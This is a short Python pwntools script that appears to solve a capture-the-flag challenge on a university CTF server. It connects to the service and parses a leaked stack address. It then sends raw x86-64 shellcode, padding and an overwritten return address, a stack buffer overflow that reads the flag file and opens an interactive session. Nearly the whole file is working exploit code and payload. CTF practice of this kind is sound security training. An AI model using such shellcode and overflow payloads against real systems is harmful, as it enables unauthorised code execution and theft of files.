#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys
host="ctf.adl.csie.ncu.edu.tw"
port="11003"

#host = "127.0.0.1"
#port = "8889"

r=remote(host,port)

#  40051f:	48 31 c0             	xor    %rax,%rax
#  400522:	04 01                	add    $0x1,%al
#\x48\x31\xc0\x04\x01
shellcode='\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff/home/shellcode/flag\x00'

print len(shellcode)

temp = 0x7fffffffe2e0
tempret2 = p64(temp)
print('tempret2',tempret2)

print(r.recvuntil("is "))
goal=r.recv(14)
print(goal)
goal=int(goal,16)
ret2 = p64(goal)
print("ret2",ret2)
#hi = '0x1111'
#hi = int(hi,16)
#print p64(hi)
#print (goal)
#print (hex(goal))
#print p64(goal)
#print(hex(u64(p64(goal))))
#p64可以把一個64進位的位址值打包成\x形式的string
payload = shellcode +'a'*33 + ret2
print ('payload',payload)
print len(payload)
r.sendline(payload)
#0x7fffffffe388 >> return位址
#file = open('data.txt', 'w')
#file.write(payload)
#file.close()
r.interactive()
